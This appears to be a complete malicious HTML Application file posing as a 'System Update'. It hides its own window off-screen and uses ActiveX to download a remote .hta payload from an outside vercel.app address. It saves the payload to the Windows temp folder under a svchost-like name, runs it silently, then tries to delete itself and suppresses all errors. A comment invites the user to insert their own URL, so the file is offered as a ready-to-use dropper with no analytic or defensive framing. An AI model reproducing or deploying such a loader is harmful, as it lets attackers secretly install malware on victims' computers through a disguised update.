<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION 
    ID="oHTA"
    APPLICATIONNAME="System Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    SCROLL="no"
    SELECTION="no"
    INNERBORDER="no"
/>
<style>
    body { 
        margin: 0; 
        padding: 0; 
        width: 1px; 
        height: 1px; 
        background-color: transparent; 
        overflow: hidden;
        visibility: hidden;
    }
</style>
<title>Update</title>
</head>
<body>
    <script language="JavaScript">
        // Force the window to be 1x1 and move it off-screen
        window.resizeTo(1, 1);
        window.moveTo(-2000, -2000);

        try {
            // 1. Download payload
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            // REPLACE WITH YOUR ACTUAL VERCEL URL
            x.open("GET", "https://swift-executorlol.vercel.app/delta.hta", false); 
            x.send();

            // 2. Save to Temp (Guaranteed permissions)
            var s = new ActiveXObject("ADODB.Stream");
            s.Open();
            s.Type = 1; // Binary
            s.Write(x.responseBody);
            
            // Use a generic name in the temp folder
            var tempPath = "C:\\Windows\\Temp\\svchost_update.dat";
            s.SaveToFile(tempPath, 2); 
            s.Close();

            // 3. Execute silently
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run(tempPath, 0, false);

            // 4. Self-destruct
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            fso.DeleteFile(WScript.ScriptFullName);

        } catch (e) {
            // Silent fail
        }
    </script>
</body>
</html>
